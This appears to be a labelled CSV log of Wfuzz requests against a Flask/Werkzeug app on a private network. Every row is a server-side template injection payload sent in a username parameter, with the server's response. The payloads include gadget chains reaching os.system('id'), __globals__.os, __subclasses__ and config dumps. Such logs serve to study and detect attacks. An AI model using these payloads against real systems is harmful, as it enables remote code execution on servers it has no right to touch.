ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.cache.compat.inspect.os.systemid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34372
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.util.os.systemid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34388
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.filters.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.filters.compat.inspect.linecache.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34396
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.compat.inspect.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34408
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.compat.inspect.linecache.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34410
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.filters.compat.inspect.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34414
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.cache.compat.inspect.linecache.os.systemid}</h2> ",close,71,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34420
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.cache.util.os.systemid}</h2> ",close,66,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34430
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.util.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34444
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.cache.util.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34446
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.cache.util.compat.inspect.linecache.os.systemid}</h2> ",close,76,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34448
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.filters.compat.inspect.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34452
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.compat.inspect.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34468
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.filters.compat.inspect.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34472
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.exceptions.util.os.systemid}</h2> ",close,85,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34476
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.mmarker.module.runtime.util.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34486
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.exceptions.util.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34498
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.compat.inspect.linecache.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34500
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.cache.compat.inspect.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34508
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34520
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.filters.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34522
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.compat.inspect.os.systemid}</h2> ",close,83,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34526
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.mmarker.module.cache.util.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34528
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.template.module.runtime.util.os.systemid}</h2> ",close,77,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34538
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.compat.inspect.linecache.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34552
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.filters.compat.inspect.linecache.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34560
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.exceptions.util.os.systemid}</h2> ",close,81,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34566
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.cache.compat.inspect.os.systemid}</h2> ",close,76,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34572
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.template.module.cache.util.os.systemid}</h2> ",close,75,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34574
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.compat.inspect.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34576
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.cache.compat.inspect.linecache.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34578
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.cache.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34586
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.util.compat.inspect.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34602
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.traceback.linecache.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34606
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.compat.inspect.linecache.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34608
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.util.os.systemid}</h2> ",close,74,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34620
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.util.compat.inspect.os.systemid}</h2> ",close,77,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34630
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.cache.util.compat.inspect.os.systemid}</h2> ",close,75,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34640
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.util.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34650
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.compat.inspect.os.systemid}</h2> ",close,74,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34660
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.traceback.linecache.os.systemid}</h2> ",close,88,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34664
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self._TemplateReference__context.joiner.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34678
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{namespace.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34688
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%23%7B3%2A3%7D%0A,"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34702
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bconfig.items%28%29%7D%7D%0A,"<h2>Hey, &lt;built-in method items of Config object at 0x7f55446d9f80&gt;</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34718
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34730
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bdump%28app%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34740
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%40%286%2B5%29%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34744
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%23%7B%203%20%2A%203%20%7D%0A,"<h2>Hey, {    }</h2> ",close,21,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34758
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7B%7B3%2A3%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34768
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7B6%2A6%7D%0A,"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34782
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%3C%25%3D%203%20%2A%203%20%25%3E%0A,"<h2>Hey,     </h2> ",close,19,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34794
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B3%2A%273%27%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34808
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B3%2A3%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34814
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{joiner.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34824
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34840
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{cycler.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34842
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self._TemplateReference__context.cycler.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34858
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self._TemplateReference__context.namespace.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34866
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34868
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34876
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34884
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,"<h2>Hey, { for key value in config.iteritems }dtdtdddd{ endfor }</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34890
